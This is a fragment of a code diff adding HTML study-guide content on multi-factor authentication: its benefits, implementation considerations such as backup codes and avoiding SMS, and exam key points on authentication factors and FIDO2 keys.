+            <ul>
+                <li>Significantly reduces account compromise risk (Microsoft reports 99.9% reduction)</li>
+                <li>Protects against password-based attacks (phishing, brute force, credential stuffing)</li>
+                <li>Provides layered security - single factor compromise doesn't grant access</li>
+                <li>Meets compliance requirements (PCI-DSS, HIPAA, GDPR)</li>
+            </ul>
+
+            <h3>MFA Implementation Considerations</h3>
+            <ul>
+                <li><strong>User Experience:</strong> Balance security with convenience</li>
+                <li><strong>Recovery Options:</strong> Plan for lost devices (backup codes, recovery methods)</li>
+                <li><strong>Risk-Based MFA:</strong> Require additional factors only for suspicious activities</li>
+                <li><strong>Avoid SMS:</strong> Use authenticator apps or hardware keys for higher security</li>
+            </ul>
+
+            <div class="key-points">
+                <h4>Key Points for Examination:</h4>
+                <ul>
+                    <li>MFA requires two or more authentication factors from different categories</li>
+                    <li>Three factors: Something you know, have, and are</li>
+                    <li>SMS OTP is vulnerable to SIM swapping - authenticator apps are more secure</li>
+                    <li>Hardware security keys (FIDO2) provide the strongest protection</li>
+                    <li>MFA significantly reduces (99.9%) account compromise risk</li>
+                    <li>Required by many compliance frameworks (PCI-DSS, HIPAA)</li>
+                </ul>
+            </div>
+        </section>
+
         <!-- Unit Summary -->
         <div class="unit-summary">
             <h3>Unit III Summary</h3>
